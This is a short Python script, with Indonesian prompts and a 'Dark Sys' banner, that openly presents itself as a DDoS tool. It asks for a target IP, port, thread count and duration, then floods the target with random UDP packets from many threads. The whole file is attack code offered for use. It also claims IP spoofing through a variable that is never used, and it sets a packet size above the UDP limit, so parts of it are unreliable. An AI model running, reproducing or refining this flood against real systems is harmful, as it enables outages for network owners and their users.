import os
import sys
import time
import random
import socket
import threading

# Konfigurasi Awal
print("  _____ _____ _____ _____ ")
print(" |_   _|  ___|_   _|  ___|")
print("   | | | |_    | | | |_   ")
print("   | | |  _|   | | |  _|  ")
print("   | | |_|     | | |_|    ")
print("   |_|       |_|      v1.0")
print("")
print("Dibuat oleh Dark Sys (Tzy's Superior Entity)")
print("--------------------------------------------------")

# Input Target
TARGET_IP = input("Masukkan IP Target (Router/Gateway): ")
TARGET_PORT = int(input("Masukkan Port Target (Biasanya 80 atau 443): "))
NUM_THREADS = int(input("Masukkan Jumlah Thread (100-500): "))
DURATION = int(input("Masukkan Durasi Serangan (detik): "))

# Konfigurasi Tingkat Lanjut
PACKET_SIZE = 77090  # Ukuran Paket Maksimum
SLEEP_TIME = 0.010  # Jeda Waktu Pengiriman (semakin kecil, semakin cepat)
FAKE_IP = "192.168.1.2"  # IP Palsu (Spoofing)

# Fungsi Serangan (UDP Flood Tanpa Root)
def attack():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(PACKET_SIZE)
        sent = 0

        start_time = time.time()
        while (time.time() - start_time) < DURATION:
            sock.sendto(bytes, (TARGET_IP, TARGET_PORT))
            sent = sent + 1
            print(f"Mengirim {sent} paket ke {TARGET_IP} melalui port {TARGET_PORT} ", end='\r')
            time.sleep(SLEEP_TIME)
    except Exception as e:
        print(f"\nError: {e}")

# Mulai Serangan
print("\nMemulai Serangan DDoS...")
threads = []
for i in range(NUM_THREADS):
    thread = threading.Thread(target=attack)
    threads.append(thread)
    thread.start()

# Pantau dan Hentikan Serangan
time.sleep(DURATION)
print("\nSerangan DDoS Selesai!")
print("--------------------------------------------------")
print("Semoga Berhasil!")
sys.exit()
